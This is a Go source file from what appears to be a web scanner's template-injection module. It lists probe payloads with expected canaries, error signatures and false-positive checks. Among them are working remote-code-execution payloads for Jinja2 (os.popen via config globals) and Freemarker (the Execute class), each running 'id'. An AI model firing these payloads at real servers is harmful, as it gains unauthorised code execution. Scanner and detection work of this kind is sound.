package sstiengine

import "strings"

// SSTIProbe pairs an engine-specific payload with the canary it's expected
// to produce in the response if a template engine actually executes it.
type SSTIProbe struct {
	Payload  string
	Expected string // searched for in the response body
	Engine   string
	IsRCE    bool
}

// Probes is the payload corpus: engine-agnostic math canaries first, then
// engine-specific fingerprints, then RCE-escalation payloads last.
var Probes = []SSTIProbe{
	// ── Math canary (1337 * 1337 = 1787569) — works on all engines ─
	{"{{1337*1337}}", "1787569", "Jinja2/Nunjucks/Twig (math)", false},
	{"${1337*1337}", "1787569", "Freemarker/Groovy (math)", false},
	{"#{1337*1337}", "1787569", "Spring EL / Pebble (math)", false},
	{"<%= 1337*1337 %>", "1787569", "Ruby ERB / Mako (math)", false},
	{"#set($x=1337*1337)${x}", "1787569", "Velocity (math)", false},

	// ── Jinja2-spesifik (7*'7' = '7777777') ─────────────────────────
	{"{{7*'7'}}", "7777777", "Jinja2 (string-repeat fingerprint)", false},

	// ── Twig-spesifik ────────────────────────────────────────────────
	// 7331*1337 = 9801547: unlike 7*7 = 49, it does not turn up by chance
	// in a CSRF token, a CSS value or a version number.
	{"{{7331*1337}}", "9801547", "Twig/Jinja2 (generic)", false},
	{"{7331*1337}", "9801547", "Smarty (curly-only)", false},

	// ── Smarty-spesifik ──────────────────────────────────────────────
	{"{$smarty.version}", "Smarty", "Smarty (version disclosure)", false},
	{"{math equation=\"x*y\" x=7331 y=1337}", "9801547", "Smarty (math function)", false},

	// ── Freemarker-spesifik ──────────────────────────────────────────
	{"${\"freemarker\".toUpperCase()}", "FREEMARKER", "Freemarker (string method)", false},
	{"[#assign x=7331*1337]${x?c}", "9801547", "Freemarker (assign directive)", false},

	// ── Mako (Python) ────────────────────────────────────────────────
	{"${7331*1337}", "9801547", "Mako/Python (dollar-brace)", false},

	// ── Universal polyglot ───────────────────────────────────────────
	{"{{7331*1337}}${7331*1337}#{7331*1337}<%= 7331*1337 %>${{7331*1337}}", "9801547", "Polyglot (universal)", false},

	// ── Jinja2 RCE Escalation ────────────────────────────────────────
	{
		"{{''.__class__.__mro__[1].__subclasses__()}}",
		"<class",
		"Jinja2 (Python object chain — RCE escalation)",
		true,
	},
	{
		"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
		"uid=",
		"Jinja2 RCE (os.popen('id'))",
		true,
	},

	// ── Freemarker RCE ───────────────────────────────────────────────
	{
		`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`,
		"uid=",
		"Freemarker RCE (Execute class)",
		true,
	},
}

// ErrorSigs are template-engine parse-error strings that leak SSTI surface
// area even when a payload's canary never fires.
var ErrorSigs = []string{
	"TemplateSyntaxError", "TemplateNotFound", "UndefinedError",
	"Unclosed comment", "ParseError", "TemplateSyntaxException",
	"freemarker.core", "org.springframework.expression",
	"javax.el.ELException", "SmartTemplateException",
}

// Fingerprint identifies which template engine produced body by matching it
// against every probe's expected canary.
func Fingerprint(body string) string {
	for _, probe := range Probes {
		if probe.Engine != "" && strings.Contains(body, probe.Expected) {
			return probe.Engine
		}
	}
	return "Unknown Engine"
}

// controlValue is a harmless input that holds none of the probes' canaries.
const controlValue = "dormctlqzx"

// fired reports whether probe's canary is evidence that a template engine
// ran the payload: it is in the payload response, it is not in the
// response to the same endpoint and parameter with controlValue (a CSRF
// token, a CSS value or a version string that happens to hold it), and the
// response is not just the payload echoed back.
func fired(probe SSTIProbe, body, control string) bool {
	return strings.Contains(body, probe.Expected) &&
		!strings.Contains(control, probe.Expected) &&
		!strings.Contains(body, probe.Payload)
}

// leakedError returns the template error signature in body that the
// control response does not already carry, or "".
func leakedError(body, control string) string {
	for _, sig := range ErrorSigs {
		if strings.Contains(body, sig) && !strings.Contains(control, sig) {
			return sig
		}
	}
	return ""
}
